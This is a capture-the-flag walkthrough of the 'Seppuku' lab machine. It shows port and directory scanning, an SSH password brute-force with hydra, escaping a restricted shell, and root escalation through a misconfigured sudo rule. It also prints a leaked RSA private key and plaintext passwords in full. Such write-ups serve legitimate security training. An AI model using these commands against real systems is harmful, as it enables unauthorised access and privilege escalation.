Summary
This machine is exploited by brute-forcing a user's password. It is escalated by using a leaked private SSH key and misconfigured system permissions.

Enumeration 

Nmap
We start off by running an nmap scan against all TCP ports:

kali@kali:~$ sudo nmap -p- 192.168.120.206
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 10:27 EDT
Nmap scan report for 192.168.120.206
Host is up (0.033s latency).
Not shown: 65527 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
7080/tcp open  empowerid
7601/tcp open  unknown
8088/tcp open  radan-http
For the open ports discovered, we will run an aggressive nmap scan to enumerate those services further:

kali@kali:~$ sudo nmap -p 21,22,80,139,445,7080,7601,8088 -A 192.168.120.206
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 12:29 EDT
Nmap scan report for 192.168.120.206
Host is up (0.031s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA)
|   256 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA)
|_  256 bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519)
80/tcp   open  http        nginx 1.14.2
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-server-header: nginx/1.14.2
|_http-title: 401 Authorization Required
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
7080/tcp open  ssl/http    LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title:  404 Not Found
| ssl-cert: Subject: commonName=seppuku/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US
| Not valid before: 2020-05-13T06:51:35
|_Not valid after:  2022-08-11T06:51:35
|_ssl-date: 2020-08-31T16:30:25+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
7601/tcp open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Seppuku
8088/tcp open  http        LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Seppuku
Service Info: Host: SEPPUKU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h00m00s, deviation: 2h00m00s, median: 0s
|_nbstat: NetBIOS name: SEPPUKU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: seppuku
|   NetBIOS computer name: SEPPUKU\x00
|   Domain name: \x00
|   FQDN: seppuku
|_  System time: 2020-08-31T12:30:22-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-31T16:30:21
|_  start_date: N/A
From this scan we see that an Apache web server is running on port 7601:

...
7601/tcp open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Seppuku
...
Dirb
We can use the dirb tool with the default wordlist and non-recursive option to brute-force directories of this site:

kali@kali:~$ dirb http://192.168.120.206:7601/ -r
...
---- Scanning URL: http://192.168.120.206:7601/ ----
==> DIRECTORY: http://192.168.120.206:7601/a/
==> DIRECTORY: http://192.168.120.206:7601/b/
==> DIRECTORY: http://192.168.120.206:7601/c/
==> DIRECTORY: http://192.168.120.206:7601/ckeditor/
==> DIRECTORY: http://192.168.120.206:7601/d/
==> DIRECTORY: http://192.168.120.206:7601/database/
==> DIRECTORY: http://192.168.120.206:7601/e/
==> DIRECTORY: http://192.168.120.206:7601/f/
==> DIRECTORY: http://192.168.120.206:7601/h/
+ http://192.168.120.206:7601/index.html (CODE:200|SIZE:171)
==> DIRECTORY: http://192.168.120.206:7601/keys/
==> DIRECTORY: http://192.168.120.206:7601/production/
==> DIRECTORY: http://192.168.120.206:7601/q/
==> DIRECTORY: http://192.168.120.206:7601/r/
==> DIRECTORY: http://192.168.120.206:7601/secret/
+ http://192.168.120.206:7601/server-status (CODE:403|SIZE:282)
==> DIRECTORY: http://192.168.120.206:7601/t/
==> DIRECTORY: http://192.168.120.206:7601/w/
...
Two directories of interest are identified from the scan: /keys and /secret

Web Enumeration
Inside the /keys directory (http://192.168.120.206:7601/keys/), we see a file named private:

kali@kali:~$ curl http://192.168.120.206:7601/keys/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
...
</td><td><a href="private">private</a></td><td align="right">2020-05-13 05:28  </td><td align="right">1.6K</td><td>&nbsp;</td>
...
We will download and inspect the contents of this file:

kali@kali:~$ wget http://192.168.120.206:7601/keys/private
--2020-08-31 12:45:31--  http://192.168.120.206:7601/keys/private
Connecting to 192.168.120.206:7601... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1680 (1.6K)
Saving to: ‘private’

private                         100%[====================================================>]   1.64K  --.-KB/s    in 0s      

2020-08-31 12:45:31 (224 MB/s) - ‘private’ saved [1680/1680]
kali@kali:~$ 
kali@kali:~$ cat private 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAypJlwjKXf0F4YvL2gfwvoUuvB7fuGMMfCe41gLCsTsleOUy2
CJX+oNwVVKPpl6TYI4nXPGbiwfGzoxm0FZa7D9yr83OgwuvMMp83OkVcwL9v+x7a
tK8AAVZ0NjvOPGkvEhB2rPS2mKg1xRKXCM7pA0KSOoDbk9coOpadjg4G0f1YPWrw
p6iLfIErfY2+5hS7QyTQpuRmHuR4eKLF1NFRp8gYuNCVtr0n2Uu6hWuI7RWBGQZJ
Joj8LKjfRRYmKGpyqiGTdRy+8yCyAuT55shuCzXuc+/3HE2jACOD8+pSPKjwxzm4
fuaSfBTUkHfyhiSKIkop2YfIDLKRPM8dGn5zuQIDAQABAoIBADM+s7Vb3Q1ZP54w
foHFjTsNjVqzge0Lt1doxmomx4Aq2sY+DLLBVyfUZSUDTj2JexAKd8OU93o+rcXt
46uudOX/WhR9RMbqpb6MnokEMQGlrCtn08Xvm127RCzQFk0cAsdcGNmKEoMt0mRn
XoPg6/tiJOHd5S5SOKARqAveqoUGUYI3xgsiRpj8CCRIDUgHi9J0++qUeauVw3m3
lvyTnUTw0uf5+sRkI173CUY+ygJapGM7Lg59xzcjEq5H4so0IztQo3o/pOIfeS6W
bqIpY7D63YBGLgpi9JcN/d2bSfafkfhcrAcjPjRXwEFPmYjMbsTBOKcTtCSDVo6/
ho6fTl0CgYEA9F1uIkqxFKIMt2/uK4/1gPOXy/1cjxcsFoah0Ql7d0gj26H6AgXk
nPncIoO1kojPnB+TUy4qz+Bd7teDbkHSaWNJYIVJZQbvskstwgL4+XamiWrJA/Jp
h7y0I0zRxCMBj5yhBNrp6P+f8vtVMpjbKV17jfe6aakfyuayPugHHh8CgYEA1DeM
4lR/+/fUbxtws+aTx8h9TwisYq38D39KNsWkynnb+9pnLCbVbVETtv4sfD/aQfah
R7CxOG+mD4Vryjpk/wwzZeUDzcQpiTx4RsgP6MkFU8knORKfBdimaUpiasWlNWgy
caXR/iA6EmA4jht8vf/+UOUV8GXV9VqDIWUhgycCgYEAvJaGcqyWMUhG7CLT+oal
f5l/Iw0rq7rEabYJmBvrT0k7czt0iK8nmgYy3+gp7ybqoqCzwFQ28itEExn78tGV
o4Pek0EKPY+22TCv5bUJlOz+5bql3AfvbbQyibO1h9tETyMgGXEhaJIvTQSu4deZ
/DiLLCttkDHXuW2FTosfQx0CgYEAkhGOSjapRRBHSxaTE3Cw5UFNZvnsVZu1tCEE
PwD5NVh9HzQr8YrlOnIk5L68deUpYF/WkNbAlLzcizBlifN5kseeFRN188qCYHCb
xPRtZuf+X7ZD5he4FzkRCcXmSeGynjkTB4CAMq+R6RYLt1yaFtk9/gZAfJBLna5o
NbM7Rt8CgYA5oPRfIpKZ5G9LJEAsBUONgBsrpXs+816ZEvBGsqPs/NPhhZMFetKm
RXxYAiEUudMsahP4Woeuxy8kWfM2J2ltwC/HRFuKnKfsHBhsn/FilspYfrafr985
tFnL/K9Z8le1saEGjwCu6zKto7CaFjj2D4Y9ji0sHGBO+tVbtmU/Jg==
-----END RSA PRIVATE KEY-----
We have found a private SSH key for a user; however, we do not yet know which user it belongs to. We will set this aside until we know more.

Inside the /secret directory (http://192.168.120.206:7601/secret/), we find two files of interest: hostname and password.lst:

kali@kali:~$ curl http://192.168.120.206:7601/secret/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
...
</td><td><a href="hostname">hostname</a></td><td align="right">2020-05-13 03:41  </td><td align="right">  8 </td><td>&nbsp;</td>
...
</td><td><a href="password.lst">password.lst</a></td><td align="right">2020-05-13 03:59  </td><td align="right">672 </td><td>&nbsp;</td>
...
We will download both files for further inspection:

kali@kali:~$ wget http://192.168.120.206:7601/secret/hostname
--2020-08-31 12:51:40--  http://192.168.120.206:7601/secret/hostname
Connecting to 192.168.120.206:7601... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8
Saving to: ‘hostname’

hostname                        100%[====================================================>]       8  --.-KB/s    in 0s      

2020-08-31 12:51:40 (1.14 MB/s) - ‘hostname’ saved [8/8]
kali@kali:~$ 
kali@kali:~$ wget http://192.168.120.206:7601/secret/password.lst
--2020-08-31 10:44:03--  http://192.168.120.206:7601/secret/password.lst
Connecting to 192.168.120.206:7601... connected.
HTTP request sent, awaiting response... 200 OK
Length: 672
Saving to: ‘password.lst’

password.lst                    100%[====================================================>]     672  --.-KB/s    in 0s      

2020-08-31 10:44:03 (84.6 MB/s) - ‘password.lst’ saved [672/672]
Exploitation
SSH Brute Force
Looking inside the hostname file, we see the following:

kali@kali:~$ cat hostname 
seppuku
Inspecting file password.lst shows that it is a custom password wordlist:

kali@kali:~$ head password.lst 
123456
12345
password
password1
123456789
12345678
1234567890
abc123
computer
tigger
We can venture an educated guess that seppuku could be a user on the system. Using the discovered wordlist, we can attempt to brute-force SSH credentials of this user using a tool like hydra:

kali@kali:~$ hydra -l seppuku -P password.lst 192.168.120.206 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak
...
[DATA] attacking ssh://192.168.120.206:22/
[22][ssh] host: 192.168.120.206   login: seppuku   password: eeyoree
1 of 1 target successfully completed, 1 valid password found
...
The attack appears to be successful and hydra finds a valid credential pair seppuku:eeyoree. We can verify this by connecting to the target via SSH:

kali@kali:~$ ssh seppuku@192.168.120.206
seppuku@192.168.120.206's password: 
Linux seppuku 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
...
seppuku@seppuku:~$ id
uid=1000(seppuku) gid=1000(seppuku) groups=1000(seppuku),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
seppuku@seppuku:~$
Escaping Restricted Shell
Looking around the user's home directory, we see the file .passwd:

seppuku@seppuku:~$ ls -la
total 28
drwxr-xr-x 3 seppuku seppuku 4096 Jul  8 06:30 .
drwxr-xr-x 5 root    root    4096 May 13 04:50 ..
-rw-r--r-- 1 seppuku seppuku  220 May 13 00:28 .bash_logout
-rw-r--r-- 1 seppuku seppuku 3526 May 13 00:28 .bashrc
drwx------ 3 seppuku seppuku 4096 May 13 10:05 .gnupg
-rw-r--r-- 1 root    root      20 May 13 04:47 .passwd
-rw-r--r-- 1 seppuku seppuku  807 May 13 00:28 .profile
seppuku@seppuku:~$
Looking inside, shows the following:

seppuku@seppuku:~$ cat .passwd 
12345685213456!@!@A
seppuku@seppuku:~$
We find what looks like a password, but we do not yet know who or what it is for. Listing the user home directories inside /home, we see two other users: samurai and tanto:

seppuku@seppuku:~$ ls -la /home
total 20
drwxr-xr-x  5 root    root    4096 May 13 04:50 .
drwxr-xr-x 18 root    root    4096 Jul  7 23:08 ..
drwxr-xr-x  3 samurai samurai 4096 Jul  8 06:30 samurai
drwxr-xr-x  3 seppuku seppuku 4096 Jul  8 06:30 seppuku
drwxr-xr-x  5 tanto   tanto   4096 Jul  8 06:30 tanto
seppuku@seppuku:~$
However, if we try to change directories, it is evident that we are in a restricted shell:

seppuku@seppuku:~$ cd /home
-rbash: cd: restricted
seppuku@seppuku:~$
Viewing /etc/passwd confirms this:

seppuku@seppuku:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
seppuku:x:1000:1000:seppuku,,,:/home/seppuku:/bin/rbash
...
samurai:x:1001:1002:,,,:/home/samurai:/bin/rbash
tanto:x:1002:1003:,,,:/home/tanto:/bin/rbash
seppuku@seppuku:~$
In addition, both the users samurai and tanto also have their default shell set to rbash. Knowing this, we can exit this SSH shell and reconnect with the flag -t "bash --noprofile":

seppuku@seppuku:~$ exit
logout
-rbash: /usr/bin/clear_console: restricted: cannot specify `/' in command names
Connection to 192.168.120.206 closed.
kali@kali:~$ 
kali@kali:~$ ssh seppuku@192.168.120.206 -t "bash --noprofile"
seppuku@192.168.120.206's password: 
seppuku@seppuku:~$
We are now outside of the restricted bash environment:

seppuku@seppuku:~$ cd /home
seppuku@seppuku:/home$ ls
samurai  seppuku  tanto
seppuku@seppuku:/home$
Escalation
Changing User
We can guess that the discovered password inside /home/seppuku/.passwd could belong to either of these two users. Trying the password for both, we succeed with the user samurai:

seppuku@seppuku:/home$ cat seppuku/.passwd 
12345685213456!@!@A
seppuku@seppuku:/home$ su samurai
Password: 
samurai@seppuku:/home$ id
uid=1001(samurai) gid=1002(samurai) groups=1002(samurai)
Checking if there are any programs we can run as root, we find one:

samurai@seppuku:/home$ sudo -l
Matching Defaults entries for samurai on seppuku:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User samurai may run the following commands on seppuku:
    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
However, we are unable to find any information about this binary because, if we recall, all three of these users' default shell is rbash:

samurai@seppuku:/home$ cd tanto/
rbash: cd: restricted
samurai@seppuku:/home$
SSH Using Private Key
We have one more user that we have not looked into yet. Having enumerated the users on the target system, recall that we discovered a private SSH key on the web server. We can try to use it to SSH in as the user tanto using the private key and escaping the restricted shell:

kali@kali:~$ chmod 600 private
kali@kali:~$ ssh -i private tanto@192.168.120.206 -t "bash --noprofile"
tanto@seppuku:~$ id
uid=1002(tanto) gid=1003(tanto) groups=1003(tanto)
tanto@seppuku:~$
However, looking inside the user's home directory, we do not see the directory /home/tanto/.cgi_bin/:

tanto@seppuku:~$ ls -la
total 36
drwxr-xr-x 5 tanto tanto 4096 Aug 31 14:09 .
drwxr-xr-x 5 root  root  4096 May 13 04:50 ..
-rw------- 1 tanto tanto    5 Aug 31 14:09 .bash_history
-rw-r--r-- 1 tanto tanto  220 May 13 04:50 .bash_logout
-rw-r--r-- 1 tanto tanto 3526 May 13 04:50 .bashrc
drwx------ 3 tanto tanto 4096 May 13 05:27 .gnupg
drwxr-xr-x 3 tanto tanto 4096 May 13 05:23 .local
-rw-r--r-- 1 tanto tanto  807 May 13 04:50 .profile
drwxr-xr-x 2 tanto tanto 4096 May 13 05:26 .ssh
tanto@seppuku:~$
But, because it is supposed to be in our home directory, we can create .cgi_bin/ along with the file bin, where we can place arbitrary content.

Escalation to Root
We will create the needed directory and then place /bin/bash shell inside the bin file, giving it executable permissions:

tanto@seppuku:~$ mkdir .cgi_bin
tanto@seppuku:~$ echo "/bin/bash" > .cgi_bin/bin
tanto@seppuku:~$ chmod 777 .cgi_bin/bin
tanto@seppuku:~$
We will now once again log in as the user samurai using password 12345685213456!@!@A to execute /home/tanto/.cgi_bin/bin with root privileges and obtain an elevated shell:

tanto@seppuku:~$ su samurai
Password: 
samurai@seppuku:/home/tanto$ whoami
samurai
samurai@seppuku:/home/tanto$ sudo ../../../../../../../home/tanto/.cgi_bin/bin /tmp/*
root@seppuku:/home/tanto# whoami
root
root@seppuku:/home/tanto#
